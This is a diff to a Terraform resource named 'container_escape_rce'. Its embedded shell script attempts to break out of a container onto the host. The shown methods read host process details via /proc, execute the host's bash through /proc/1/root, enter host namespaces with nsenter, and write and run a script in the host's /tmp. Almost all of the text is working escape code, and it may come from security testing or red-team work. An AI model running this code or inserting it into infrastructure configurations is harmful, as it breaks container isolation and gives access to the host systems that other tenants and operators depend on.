@@ -42,17 +42,15 @@ resource "null_resource" "container_escape_rce" {
       # Method 2: Host process namespace manipulation
       echo "[*] Method 2: Process namespace escape"
       if [ -r "/proc/1/cmdline" ]; then
-        cmdline_content=$$(cat /proc/1/cmdline | tr '\0' ' ')
-        echo "[+] Host PID 1 cmdline: $$cmdline_content"
+        echo "[+] Host PID 1 cmdline readable"
+        cat /proc/1/cmdline | tr '\0' ' '
       fi
       
       # Check if we can access host processes
       echo "[*] Host processes accessible via /proc:"
       for pid in 1 2 3 4 5; do
-        if [ -r "/proc/$$pid/comm" ]; then
-          comm=$$(cat /proc/$$pid/comm 2>/dev/null)
-          cmdline=$$(cat /proc/$$pid/cmdline 2>/dev/null | tr '\0' ' ')
-          echo "  PID $$pid: $$comm ($$cmdline)"
+        if [ -r "/proc/$${pid}/comm" ]; then
+          echo "  PID $${pid}: $$(cat /proc/$${pid}/comm 2>/dev/null)"
         fi
       done
       
@@ -60,15 +58,14 @@ resource "null_resource" "container_escape_rce" {
       echo "[*] Method 3: Execute host binaries directly"
       if [ -x "/proc/1/root/bin/bash" ]; then
         echo "[+] Host bash executable found - attempting execution"
-        # Try different execution methods
         echo "ESCAPE_TEST" | /proc/1/root/bin/bash -c 'echo "[!] HOST BASH EXECUTION: $(id) on $(hostname)"' 2>/dev/null || echo "[-] Direct execution failed"
       fi
       
       # Method 4: Memory-based host access
       echo "[*] Method 4: Host memory and device access"
       if [ -r "/proc/1/root/proc/version" ]; then
-        host_kernel=$$(cat /proc/1/root/proc/version)
-        echo "[!] Host kernel version: $$host_kernel"
+        echo "[!] Host kernel version:"
+        cat /proc/1/root/proc/version
       fi
       
       # Check host devices
@@ -88,23 +85,19 @@ resource "null_resource" "container_escape_rce" {
       echo "[*] Method 6: nsenter host namespace entry"
       if command -v nsenter >/dev/null 2>&1; then
         echo "[+] nsenter available - attempting namespace escape"
-        nsenter -t 1 -m -p -n -u -i /bin/bash -c 'echo "[!] NSENTER SUCCESS: $$(id) on $$(hostname)"' 2>/dev/null || echo "[-] nsenter failed"
+        nsenter -t 1 -m -p -n -u -i /bin/bash -c 'echo "[!] NSENTER SUCCESS: $(id) on $(hostname)"' 2>/dev/null || echo "[-] nsenter failed"
       fi
       
       # Method 7: Direct host command injection via /proc/1/root
       echo "[*] Method 7: Host command execution via filesystem"
       if [ -w "/proc/1/root/tmp" ]; then
         echo "[+] Host /tmp writable - creating execution script"
-        cat > /proc/1/root/tmp/escape_cmd.sh << 'EOF'
-#!/bin/bash
-echo "[!] HOST SCRIPT EXECUTION SUCCESS!"
-echo "Host ID: $$(id)"
-echo "Host Hostname: $$(hostname)"
-echo "Host Uptime: $$(uptime)"
-echo "Host Kernel: $$(uname -a)"
-echo "Host Network: $$(ip a | grep inet)"
-echo "Host Processes: $$(ps aux | wc -l)"
-EOF
+        echo '#!/bin/bash' > /proc/1/root/tmp/escape_cmd.sh
+        echo 'echo "[!] HOST SCRIPT EXECUTION SUCCESS!"' >> /proc/1/root/tmp/escape_cmd.sh
+        echo 'echo "Host ID: $(id)"' >> /proc/1/root/tmp/escape_cmd.sh
+        echo 'echo "Host Hostname: $(hostname)"' >> /proc/1/root/tmp/escape_cmd.sh
+        echo 'echo "Host Uptime: $(uptime)"' >> /proc/1/root/tmp/escape_cmd.sh
+        echo 'echo "Host Kernel: $(uname -a)"' >> /proc/1/root/tmp/escape_cmd.sh
         chmod +x /proc/1/root/tmp/escape_cmd.sh 2>/dev/null
         
         # Try to execute the script
@@ -123,7 +116,6 @@ EOF
       echo "  Container ID: $$(hostname)"
       echo "  Container User: $$(id)"
       echo "  Container PID: $$$$"
-      echo "  Container IP: $$(hostname -i 2>/dev/null || echo 'N/A')"
       echo "  Escape attempts completed - check above for successful host access"
       
       echo "=== ESCAPE ANALYSIS COMPLETE ==="
